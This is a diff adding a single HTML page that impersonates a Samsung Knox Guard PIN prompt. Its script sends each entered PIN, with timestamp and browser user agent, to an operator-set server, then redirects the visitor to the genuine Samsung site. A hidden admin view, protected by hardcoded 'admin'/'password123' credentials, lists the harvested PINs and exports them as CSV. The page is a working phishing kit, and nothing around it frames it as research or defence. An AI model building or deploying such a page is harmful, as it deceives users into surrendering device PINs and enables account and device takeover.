@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Samsung KXGuard — Enter PIN</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#0070f3;--muted:#9aa4b2;--glass:rgba(255,255,255,0.04)}
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,-apple-system,'Helvetica Neue',Arial}
+    body{background:linear-gradient(180deg,#071021 0%, #0b1624 100%);color:#e6eef6;display:flex;align-items:center;justify-content:center;padding:24px}
+    .card{width:100%;max-width:480px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:12px;padding:28px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 8px 30px rgba(2,6,23,0.6)}
+    h1{margin:0 0 6px;font-size:20px}
+    p.lead{margin:0 0 18px;color:var(--muted)}
+    label{display:block;margin-bottom:8px;color:var(--muted);font-size:13px}
+    input[type="password"], input[type="text"]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:var(--glass);color:inherit;font-size:16px}
+    .row{display:flex;gap:10px;margin-top:14px}
+    button{flex:1;padding:12px 14px;border-radius:10px;border:0;background:var(--accent);color:white;font-weight:600;cursor:pointer}
+    .small{font-size:13px;color:var(--muted);margin-top:12px}
+    .admin-link{margin-top:10px;display:block;text-align:center;color:var(--muted);text-decoration:underline;cursor:pointer}
+    .note{font-size:12px;color:#ffdf7e;margin-top:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="mainCard">
+    <h1>Samsung KXGuard — PIN</h1>
+    <p class="lead">Enter your device PIN to continue.</p>
+
+    <form id="pinForm">
+      <label for="pin">Enter PIN</label>
+      <input id="pin" inputmode="numeric" autocomplete="one-time-code" placeholder="Enter PIN" required />
+      <div class="row">
+        <button type="submit">Enter</button>
+      </div>
+    </form>
+
+    <div class="note">Note: Pins are sent to your server so admins can view them centrally. Update SERVER_BASE below.</div>
+    <a class="admin-link" id="adminLink">Open admin</a>
+  </div>
+
+  <script>
+    (function(){
+      // ====== CONFIG: change these ======
+      const ADMIN_USER = 'admin';
+      const ADMIN_PASS = 'password123';
+      const SERVER_BASE = 'https://your-server.com'; // <- set to your domain (no trailing slash)
+      const SAVE_URL     = SERVER_BASE + '/save-pin';
+      const ADMIN_DATA_URL = SERVER_BASE + '/get-pins';
+      const REDIRECT_URL = 'https://www.samsungknox.com/en/solutions/it-solutions/knox-guard';
+      // ==================================
+
+      const form = document.getElementById('pinForm');
+      const pinInput = document.getElementById('pin');
+      const adminLink = document.getElementById('adminLink');
+
+      form.addEventListener('submit', async function(e){
+        e.preventDefault();
+        const value = pinInput.value.trim();
+        if(!value){ alert('Please enter a PIN.'); return; }
+
+        const entry = { pin: value, ts: new Date().toISOString(), ua: navigator.userAgent };
+
+        // Send to server (best effort, ignore failure for UX)
+        try{
+          await fetch(SAVE_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(entry),
+            // send credentials if same-origin and you later lock this down:
+            credentials: 'omit'
+          });
+        }catch(err){ console.warn('Failed to send PIN to server', err); }
+
+        // Redirect to Samsung site
+        window.location.href = REDIRECT_URL;
+      });
+
+      adminLink.addEventListener('click', async function(){
+        const user = prompt('Enter admin username:');
+        const pass = prompt('Enter admin password:');
+        if(user !== ADMIN_USER || pass !== ADMIN_PASS){ alert('Invalid credentials'); return; }
+        // Load admin view
+        await renderAdmin();
+      });
+
+      async function renderAdmin(){
+        const card = document.getElementById('mainCard');
+        card.innerHTML = '';
+        const h = document.createElement('h1'); h.textContent = 'Admin — Stored PINs'; card.appendChild(h);
+        const p = document.createElement('p'); p.className = 'lead'; p.textContent = 'Entries stored on the server.'; card.appendChild(p);
+
+        let data = [];
+        try{
+          const res = await fetch(ADMIN_DATA_URL, { credentials: 'omit' });
+          data = await res.json();
+        }catch(err){
+          const errEl = document.createElement('div'); errEl.textContent = 'Error fetching admin data.'; errEl.style.color = '#ffb4b4'; card.appendChild(errEl);
+        }
+
+        if(!Array.isArray(data) || data.length === 0){
+          const empty = document.createElement('div'); empty.textContent = 'No stored entries.'; empty.style.marginTop = '12px'; card.appendChild(empty);
+        } else {
+          const pre = document.createElement('pre');
+          pre.style.maxHeight = '300px'; pre.style.overflow = 'auto'; pre.style.background='rgba(255,255,255,0.02)'; pre.style.padding='12px'; pre.style.borderRadius='8px';
+          pre.textContent = JSON.stringify(data, null, 2);
+          card.appendChild(pre);
+        }
+
+        const btnRow = document.createElement('div'); btnRow.className='row'; btnRow.style.marginTop='14px';
+        const exportBtn = document.createElement('button'); exportBtn.textContent='Export CSV';
+        const refreshBtn = document.createElement('button'); refreshBtn.textContent='Refresh';
+        exportBtn.addEventListener('click', function(){ exportCSV(data); });
+        refreshBtn.addEventListener('click', function(){ renderAdmin(); });
+        btnRow.appendChild(exportBtn); btnRow.appendChild(refreshBtn); card.appendChild(btnRow);
+
+        const back = document.createElement('a'); back.textContent = 'Back to PIN entry'; back.className='admin-link'; back.style.display='block'; back.style.marginTop='12px'; back.href = window.location.pathname; card.appendChild(back);
+      }
+
+      function exportCSV(data){
+        if(!data || !data.length){ alert('No data to export'); return; }
+        const header = ['pin','timestamp','user_agent'];
+        const rows = data.map(r => [escapeCSV(r.pin), r.ts || '', escapeCSV(r.ua)]);
+        const csv = [header.join(','), ...rows.map(r=>r.join(','))].join('\n');
+        const blob = new Blob([csv], {type: 'text/csv'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a'); a.href=url; a.download='kxguard_pins_export.csv'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+      }
+      function escapeCSV(s){ return '"'+ String(s||'').replace(/"/g,'""') +'"'; }
+    })();
+  </script>
+</body>
+</html>
